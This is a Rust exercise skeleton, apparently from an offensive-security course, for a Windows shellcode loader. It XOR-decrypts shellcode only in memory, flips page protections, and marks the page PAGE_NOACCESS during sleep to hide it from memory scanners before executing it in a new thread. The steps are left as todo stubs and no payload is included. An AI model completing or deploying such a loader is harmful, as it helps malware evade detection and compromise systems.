use std::mem::transmute;
use std::ptr;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS,
    PAGE_READWRITE, VirtualAlloc, VirtualProtect,
};
use windows::Win32::System::Threading::{
    CreateThread, INFINITE, Sleep, THREAD_CREATION_FLAGS, WaitForSingleObject,
};

const KEY: u8 = 0x4b;

// Technique 1 & 2: shellcode is stored XOR-encrypted.
// To generate: take the raw bytes from Module 01 and XOR each with KEY.
// The const fn below does this at compile time if you pass the plaintext bytes.
const fn xor_bytes<const N: usize>(data: &[u8; N], key: u8) -> [u8; N] {
    todo!() // implement: XOR each byte with key, return new array
            // Hint: use `while`, not `for` — const fn cannot use iterator methods
}

// Replace with the XOR-encrypted version of your Module 01 shellcode.
// Generate with: bytes.iter().map(|b| b ^ KEY).collect::<Vec<_>>()
// Or use xor_bytes() const fn above if you have the raw bytes as a const.
const SHELLCODE_ENC: &[u8] = &[/* encrypted bytes here */];

fn main() {
    unsafe {
        // Step 1 — Allocate RW memory (same as Module 01).
        let base = todo!("VirtualAlloc: RW region for shellcode");
        if base.is_null() {
            panic!("VirtualAlloc failed: {:?}", GetLastError());
        }

        // Step 2 — Copy SHELLCODE_ENC into the allocation and decrypt in place.
        // Hint: ptr::copy_nonoverlapping first, then XOR each byte with KEY.
        // The decrypted shellcode only ever exists in this memory region, never on disk.
        todo!("copy encrypted shellcode into allocation, then decrypt in place with KEY");

        // Step 3 — Flip to PAGE_EXECUTE_READ.
        // Hint: VirtualProtect(base, SHELLCODE_ENC.len(), PAGE_EXECUTE_READ, &mut old)
        let mut old: PAGE_PROTECTION_FLAGS = Default::default();
        todo!("VirtualProtect: PAGE_READWRITE -> PAGE_EXECUTE_READ");

        // Technique 3: sleep obfuscation.
        // During Sleep, flip the page to PAGE_NOACCESS so memory scanners cannot read it.
        // Flip back to PAGE_EXECUTE_READ before executing.

        // Step 4 — Flip to PAGE_NOACCESS before sleeping.
        // Hint: VirtualProtect(base, SHELLCODE_ENC.len(), PAGE_NOACCESS, &mut old)
        todo!("VirtualProtect: PAGE_EXECUTE_READ -> PAGE_NOACCESS");

        // Step 5 — Sleep. Memory scanners cannot read the page during this window.
        todo!("Sleep(5000)");

        // Step 6 — Flip back to PAGE_EXECUTE_READ before executing.
        // Hint: same VirtualProtect call as Step 3, reuse &mut old.
        todo!("VirtualProtect: PAGE_NOACCESS -> PAGE_EXECUTE_READ");

        // Step 7 — Execute (same as Module 01: CreateThread + WaitForSingleObject).
        todo!("CreateThread at base, WaitForSingleObject");
    }
}
